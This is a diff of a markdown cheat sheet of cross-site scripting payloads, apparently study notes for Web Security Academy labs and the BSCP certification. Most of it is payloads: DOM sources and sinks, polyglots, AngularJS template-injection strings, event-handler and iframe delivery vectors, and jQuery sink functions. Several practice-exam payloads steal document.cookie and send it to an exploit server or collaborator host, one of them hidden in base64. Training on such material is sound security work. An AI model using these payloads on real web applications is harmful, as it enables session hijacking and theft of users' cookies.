@@ -1,6 +1,5 @@
-
-## General how-to find XSS
-### DOM-based
+## General info
+#### DOM-based
 - Sources:
   - document.URLUnencoded
   - document.baseURI
@@ -30,21 +29,20 @@
   - JSON.parse()
   - element.setAttribute()
   - RegExp()
-### Polyglots
+#### Polyglots
 ```html
 <>\'\"<script>{{7*7}}$(alert(1)}trevor
 ```
-### Angular
-CSTI
-
+#### Angular
+- CSTI
 ```html
 {{constructor.constructor('alert(document.cookie)')()}}
 ```
-### Template literals
+#### Template literals
 ```html
 ${alert(1)}
 ```
-### JS
+#### JS
 - it is possible to end current script tag:
 ```html 
 </script><script>alert(1)</script>
@@ -60,7 +58,30 @@ onerror=alert; throw 1
 \';alert(10//
 &apos;alert(1);//
 ```
-### HTML
+#### JQuery
+```html
+add()
+after()
+append()
+animate()
+insertAfter()
+insertBefore()
+before()
+html()
+prepend()
+replaceAll()
+replaceWith()
+wrap()
+wrapInner()
+wrapAll()
+has()
+constructor()
+init()
+index()
+jQuery.parseHTML()
+$.parseHTML()
+```
+#### HTML
 - it is possible to create new HTML element:
 ```html
 <script>alert(1)</script>
@@ -89,7 +110,7 @@ x=150 y=100 text-anchor="middle">Click me</text></a></svg>
 href="javascript:alert(1)"
 accesskey='X' onclick='alert(1)'
 ```
-### Delivery
+#### Delivery
 - event is required
 ```html
 <iframe src="PAYLOAD">
@@ -134,27 +155,6 @@ product?productId=1&storeId="</select><img%20src=1%20onerror=alert(1)>"
 javascript:alert(1)
 javascript:alert(document.cookie)
 <iframe src="https://SOME-ID.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print(1)>'"> - hashchange event
-funcs to check:
-add()
-after()
-append()
-animate()
-insertAfter()
-insertBefore()
-before()
-html()
-prepend()
-replaceAll()
-replaceWith()
-wrap()
-wrapInner()
-wrapAll()
-has()
-constructor()
-init()
-index()
-jQuery.parseHTML()
-$.parseHTML()
 ```
 **AngularJS + angle brackets and double quotes HTML-encoded**
 ```html
@@ -261,7 +261,7 @@ location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+o
 ```html
 %27accesskey=%27x%27onclick=%27alert(1)%27x=%27
 ```
-## Practice exams payloads</h2>
+## Practice exams payloads
 ```html
 \\"-alert('XSS')}//
 \\"-eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))}//
@@ -282,7 +282,6 @@ location='https://exploit-...exploit-server.net/random?c='+document.cookie}`-""
 </script> - but "" will ruin everything, so encode second part inside find=
 ```
 Some payloads from wr3dmast3r article about [BSCP certification](https://habr.com/en/companies/jetinfosystems/articles/805297/).
-
 ```html
 "-prompt(1)-"
 "-alert(1)-"
@@ -304,5 +303,4 @@ document.location = "https://...web-security-academy.net/?SearchTerm=%22-eval%28
 <script>
 document.location="https://...web-security-academy.net/?find=\\"-setTimeout`fetch\x28'https://collaborator/jsonc='+document.cookie\x29`}//"
 </script> // don't forget to URL-encode value in find param
-
 ```
